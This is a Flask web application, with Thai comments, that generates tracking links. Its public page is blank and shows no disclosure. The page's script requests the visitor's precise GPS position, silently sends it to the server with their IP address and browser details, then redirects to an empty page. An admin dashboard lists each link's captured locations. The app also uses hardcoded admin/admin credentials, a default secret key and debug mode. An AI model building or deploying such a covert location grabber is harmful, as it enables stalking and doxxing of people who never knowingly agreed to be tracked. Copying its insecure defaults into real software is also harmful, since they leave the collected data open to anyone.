from datetime import timedelta
import sqlite3
import uuid
import os
from flask import Flask, jsonify, redirect, render_template, request, session, url_for

app = Flask(__name__)

SECRET_KEY = os.getenv("SECRET_KEY")

if not SECRET_KEY:
    SECRET_KEY = "dev-secret-key-change-this"

app.secret_key = SECRET_KEY
app.permanent_session_lifetime = timedelta(days=365)

def init_db():
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute(
        """
        CREATE TABLE IF NOT EXISTS links (
            id TEXT PRIMARY KEY
        )
    """
    )
    cursor.execute(
        """
        CREATE TABLE IF NOT EXISTS visits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            link_id TEXT,
            ip_address TEXT,
            user_agent TEXT,
            latitude REAL,
            longitude REAL,
            FOREIGN KEY(link_id) REFERENCES links(id)
        )
    """
    )
    conn.commit()
    conn.close()


init_db()


# ==========================================
# AUTH CHECK (ตรวจสอบการล็อกอินก่อนเข้าหน้า Admin)
# ==========================================


@app.before_request
def require_login():
    allowed_routes = [
        "login",
        "index",
        "track_session",
        "success",
        "api_save_location",
        "static",
    ]
    if request.endpoint and request.endpoint not in allowed_routes:
        if not session.get("logged_in"):
            return redirect(url_for("login"))


# ==========================================
# 1. PUBLIC PAGES
# ==========================================


@app.route("/")
def index():
    return ""


@app.route("/track/<link_id>")
def track_session(link_id):
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT id FROM links WHERE id = ?", (link_id,))
    link = cursor.fetchone()

    if not link:
        cursor.execute("INSERT INTO links (id) VALUES (?)", (link_id,))
        conn.commit()
    conn.close()

    return f"""
    <!DOCTYPE html>
    <html>
    <head><meta charset="utf-8"></head>
    <body>
        <script>
            function sendData(latitude, longitude) {{
                fetch('/api/save-location/{link_id}', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{ latitude: latitude, longitude: longitude }})
                }}).then(() => {{ window.location.href = '/success'; }})
                  .catch(() => {{ window.location.href = '/success'; }});
            }}

            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(
                    (pos) => {{ sendData(pos.coords.latitude, pos.coords.longitude); }},
                    (err) => {{ sendData(null, null); }},
                    {{ timeout: 5000, enableHighAccuracy: true }}
                );
            }} else {{
                sendData(null, null);
            }}
        </script>
    </body>
    </html>
    """


@app.route("/success")
def success():
    return ""


# ==========================================
# 2. AUTHENTICATION (หน้าเข้าสู่ระบบ)
# ==========================================


@app.route("/login", methods=["GET", "POST"])
def login():
    # ถ้าล็อกอินไว้อยู่แล้ว ให้ส่งไปที่หน้า admin ทันที
    if session.get("logged_in"):
        return redirect(url_for("admin_dashboard"))

    error = None
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        if username == "admin" and password == "admin":
            session.permanent = True  # สั่งให้จำ Session ไว้ตลอดจนกว่าจะ logout
            session["logged_in"] = True
            return redirect(url_for("admin_dashboard"))
        else:
            error = "Username หรือ Password ไม่ถูกต้อง!"

    return render_template("login_admin.html", error=error)


@app.route("/logout")
def logout():
    session.clear()  # ล้าง Session ทั้งหมดเมื่อกด logout
    return redirect(url_for("login"))


# ==========================================
# 3. ADMIN PAGES
# ==========================================


@app.route("/admin")
def admin_dashboard():
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute(
        """
        SELECT links.id, COUNT(visits.id) 
        FROM links 
        LEFT JOIN visits ON links.id = visits.link_id 
        GROUP BY links.id
    """
    )
    links_data = cursor.fetchall()
    conn.close()

    return render_template("admin.html", links_data=links_data)


@app.route("/admin/stats/<link_id>")
def admin_view_stats(link_id):
    conn = sqlite3.connect("database.db")
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()

    cursor.execute("SELECT id FROM links WHERE id = ?", (link_id,))
    if not cursor.fetchone():
        conn.close()
        return "ไม่พบลิงก์นี้ในระบบ", 404

    cursor.execute(
        """
        SELECT ip_address, latitude, longitude, user_agent
        FROM visits
        WHERE link_id = ?
        ORDER BY id DESC
        """,
        (link_id,),
    )

    visits = cursor.fetchall()
    conn.close()

    return render_template("admin_stats.html",link_id=link_id,visits=visits)


@app.route("/api/create-link", methods=["POST"])
def api_create_link():
    unique_id = str(uuid.uuid4())[:8]
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("INSERT INTO links (id) VALUES (?)", (unique_id,))
    conn.commit()
    conn.close()
    return redirect(url_for("admin_dashboard"))


@app.route("/api/delete-link/<link_id>", methods=["POST"])
def api_delete_link(link_id):
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("DELETE FROM visits WHERE link_id = ?", (link_id,))
    cursor.execute("DELETE FROM links WHERE id = ?", (link_id,))
    conn.commit()
    conn.close()
    return redirect(url_for("admin_dashboard"))


@app.route("/api/save-location/<link_id>", methods=["POST"])
def api_save_location(link_id):
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT id FROM links WHERE id = ?", (link_id,))
    if not cursor.fetchone():
        conn.close()
        return jsonify({"status": "error", "message": "Link not found"}), 404

    data = request.get_json() or {}
    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if user_ip and "," in user_ip:
        user_ip = user_ip.split(",")[0].strip()

    user_agent = request.headers.get("User-Agent")

    cursor.execute(
        """
        INSERT INTO visits (link_id, ip_address, user_agent, latitude, longitude)
        VALUES (?, ?, ?, ?, ?)
    """,
        (
            link_id,
            user_ip,
            user_agent,
            data.get("latitude"),
            data.get("longitude"),
        ),
    )

    conn.commit()
    conn.close()
    return jsonify({"status": "success"})


if __name__ == "__main__":
    app.run(debug=True)